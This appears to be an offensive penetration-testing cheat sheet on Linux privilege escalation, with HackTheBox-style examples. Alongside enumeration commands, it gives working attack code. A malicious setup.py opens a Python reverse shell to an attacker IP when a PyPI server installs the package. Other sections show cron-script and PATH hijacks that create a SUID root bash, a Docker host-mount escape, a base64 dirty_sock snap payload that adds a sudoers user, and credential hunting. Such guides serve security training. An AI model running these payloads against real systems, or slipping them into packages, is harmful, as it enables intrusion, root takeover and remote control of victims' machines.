# Linux/Unix Privilege Escalation

## Linux Privilege Escalation

Our ultimate goal is to escalate from a low privileged user to a user that runs as an administrator user or as the root user. Privilege escalation may not always be based on a single misconfiguration, but rather on your ability to conceptualize and integrate many misconfigurations. Many privilege escalations vectors might be considered access control violations. User authorization and access control are inextricably related. Understanding how Unix/Linux manages permissions is critical when focusing on privilege escalations in Unix/Linux systems.

## Preparation & Finding Compilers and/or Tools

Enumerate tools/languages that are installed:

```text
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
find / -name go
```

Enumerate tools for file transfers:

```text
find / -name wget
find / -name curl
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
find / -name nfs
find / -name base64
```

## File Transfers Locations

These are the directories that we usually have write access to:

```text
/dev/shm
/tmp
```

## System Information

### Operating System 

Enumerate the system distribution type and its version:

```text
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null
cat /etc/issue
cat /etc/*-release
# Debian Based
cat /etc/lsb-release 
# Redhat Based
cat /etc/redhat-release
```

### Kernel Version

Enumerate the kernel version and architecture:

```text
cat /proc/version
uname -a
uname -mrs
# RPM
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
```

### Environment Variables

Enumerate environment variables to find information \(like paths, passwords, API keys, programs, etc\):

```text
(env || set) 2>/dev/null
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

### Sudo Version

There are vulnerable sudo versions, it is worth it enumerating these:

```text
sudo -v
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

## Applications & Services

Enumerate the services that are running and their privilege:

```text
ps aux
ps -ef
top
cat /etc/services
```

### Process running as root

Enumerate services that are running as the root user and identify if one is vulnerable to something:

```text
ps aux | grep root
ps -ef | grep root
```

### Process Program Versions

Enumerate the version of the program that is running:

```text
absolute/path/of/program_name --version
program_name --version
program_name -v
```

### Package Version

Enumerate the versions of the installed packages:

```text
dpkg -l #Debian
rpm -qa #Redhat
dpkg -l | grep program_name #Debian
rpm -qa | grep program_name #Redhat
```

### Process Monitoring

We can use [pspy ](https://github.com/DominicBreuker/pspy)to dynamically monitor the processes are running in the system. Pspy is designed to snoop on processes without the need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. 

```bash
git clone https://github.com/DominicBreuker/pspy
cd pspy
go build -ldflags "-s -w" main.go
upx main
mv main pspy
python3 -m http.server 80
```

On the victim machine, download pspy and execute it:

```text
wget http://10.10.14.8/pspy
chmod +x pspy
./pspy
```

### Process Memory

Some services store credentials in plaintext in memory. Since the standard behavior is that low privileged users cannot read data from other users, this technique is most likely to be used when you're a root user but when your current user owns the process that contains the sensitive information then you can read since your user owns it.

#### Credentials in Memory

We can look up for case insensitive strings in a process as follows:

```text
strings process_name | grep -i password
```

### Installed Applications

Enumerate which applications are installed, their version, and if they are currently running in the system:

```text
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

Enumerate useful binaries or tools:

```text
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

### Services Configuration Files

Enumerate misconfigured services and if they have vulnerable plugins:

```text
find / -iname '*.conf' 2>/dev/null
find / -iname '*.ini' 2>/dev/null
locate name_here.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

Common configuration files are these:

```text
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf
cat /etc/my.conf
cat /etc/php/<version_number_here>/php.ini
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
```

### Writable .service files

Enumerate if you have `.service` files that you could modify so it executes a shell when the service is started, restarted, or stopped. Sometimes you may need to reboot the machine. 

Enumerating `.service` files in the host:

```text
find / -iname '*.service' 2>/dev/null
```

You can create a shell with something like `ExecStart=/tmp/shell.sh` 

### Writable service binaries

If we have writable binaries then we can modify them to execute shells when the service is restarted.

## Scheduled/Cron Jobs

Enumerate the scheduled jobs:

```text
crontab -l
crontab -u username -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

Enumerate Cron Jobs with [pspy](https://github.com/DominicBreuker/pspy):

```text
./pspy64 -pf -i 1000
```

### Crontabs Configuration Files

Review crontabs configuration files:

```text
cat /var/spool/cron
cat /var/spool/cron/crontabs
cat /etc/crontab
```

Some things to take into consideration are:

* Is there a cronjob running as root?
* Do you have write permissions to these files?
  * If you do then try modifying the PATH environment variable or something alike.

### Crontab PATH Environment Variable

If a cron job program/script does **not use an absolute path**, and one of the PATH directories is **writable** by our user, we may be able to create a script with the same name as the cron job.

One way we can take exploit this is by doing a SUID bit on bash:

```text
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Then we make it executable:

```text
chmod +x cron_job_name.sh
```

Now wait for the cron job to run, we can monitor it with:

```text
watch -n 1 ls -l /tmp/rootbash
```

As soon as the cron job runs the script and places SUID bit which is represented as an `s` , then we can spawn bash shell as root with the `-p` option:

```text
/tmp/rootbash -p
```

### Crontab Wildcards

Enumerate wildcards `*` in a file/script:

```text
cat /path/to/cronjob_script.sh
```

If inside the script there's a line using a wildcard `*` like the following:

```text
tar czf /tmp/filename.tar.gz *
```

With wildcards, we can execute anything and since that's the case then we can search in [GTFOBins](https://gtfobins.github.io/) for a program, in this scenario `tar` and see what we can do, for example executing a shell.

### Cron Script Overwrite

If you have **permission to modify a cron script executed by root**, then you can elevate privileges easily:

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/cron/script
# Wait until it executes
/tmp/rootbash -p
```

## Timers

## File Permissions

## Service Exploits

## Passwords, Hashes, and Credentials

We can enumerate possible files that may contain credentials.

Enumerate configuration files:

```bash
find \-type f 2>/dev/null | grep "config" | xargs grep -i "password" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|key|database" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|key|database" 2>/dev/null | grep -v -E "debconf|keyboard"
```

## SUDO

## Sticky Bits and SUID/SGID 

### Sticky Bits and SUID/SGID Enumeration

```bash
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
```

## Capabilities

Enumerate capabilities in general with:

```bash
getcap -r / 2>/dev/null
```

## NFS

## Container

### Docker

Enumerate the docker images:

```text
docker ps
```

We can use an existing image to create a container and mount the root file system in the container:

```text
docker run --rm -it -v /:/mnt username bash
cd /mnt/root/
```

Escalate privileges in the container:

```text
cd /mnt/bin
chmod 4755 bash
exit
```

Escalate privileges in the host \(not container\):

```text
bash -p
whoami

# Expected Output
root
```

## Misc

### PyPi

If the service pypi has an external connection we can follow the steps below in our host \(kali\):

```text
mkdir pypi
cd !$
mkdir pwned
cd !$
touch __init__.py
touch setup.py
```

The file **\_\_init\_\_**.py will be empty and the code of the **setup.py** is the following:

```python
import setuptools
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.205",443)) # YOUR IP and YOUR PORT
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

setuptools.setup(
    name="example-pkg-YOUR-USERNAME-HERE",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)
```

The idea here is that when the pypi server **executes** the **setup.py**, we want it to initiate a **reverse shell**.

We configure our host to be able to send the package to the victim repository:

```bash
rm ~/.pypirc
vi ~/.pypirc
```

The content of the file .pypirc will be:

```python
[distutils]
index-servers = remote

[remote]
repository = http://pypi.sneakycorp.htb:8080
username = pypi
password = soufianeelhaoui
```

Now we can send it to the target machine.

We set a listener on port 443:

```text
nc -nlvp 443
```

We send the package to the pypi server:

```bash
python3 setup.py sdist upload -r remote
```

Remember that we set a listener on port 443 and we should get a reverse shell as soon as the server executes the file **setup.py**:

```text
nc -nlvp 443
```

After we receive a reverse shell, see the new user:

```text
whoami
```

### Snap

Search for snap hook exploit .snap file and we can find the following link [Linux Privilege Escalation via snapd \(dirty\_sock exploit\)](https://initblog.com/2019/dirty-sock/). 

```text
echo "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" | xargs | tr -d ' '
```

Copy the output and recreate the package:

```text
cd /tmp
pytho -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD
//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29
jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1
EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2Q
gLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N
1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciB
leHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiA
gJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAA
BaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3F
qfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4
wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRj
NEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPt
vjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAA
AAAAAPgMAAAAAAAAEgAAAAACAA" + "A"*4256 + "=="' | base64 -d > evil.snap

sudo /usr/bin/snap install evil.snap --devmode
cat /etc/passwd
sudo dirty_sock > password dirty_sock
sudo su > password dirty_sock

whoami
# Expected Output
root
```

### Git Repositories

We can find git repositories with:

```text
find \-type f 2>/dev/null | grep ".git"
```

Sometimes, you will be able to see folders that contain a `.git` folder in them. That means that the folder is a git repository. **GIT** saves all the history of defiles changes, as an attacker, we can enumerate and see if developers have made mistakes.

```text
git log
```

We can use the parameter `-p` to look at the differences made in a commit:

```text
git log -p <ID>
```

### Decode VNC Password

VNC Passwords in a file are stored obfuscated, but they can be broken. There’s a bunch of scripts out there to return the plain text. We can use [this one](https://github.com/trinitronx/vncpasswd.py), running the python and using `-d` for decrypt, and `-f secret` to point it at our file.

```text
root@kali:~/hackthebox/poison-10.10.10.84# python /opt/vncpasswd.py/vncpasswd.py -d -f secret
Cannot read from Windows Registry on a Linux system
Cannot write to Windows Registry on a Linux system
Decrypted Bin Pass= 'VNCP@$$!'
Decrypted Hex Pass= '564e435040242421'
```







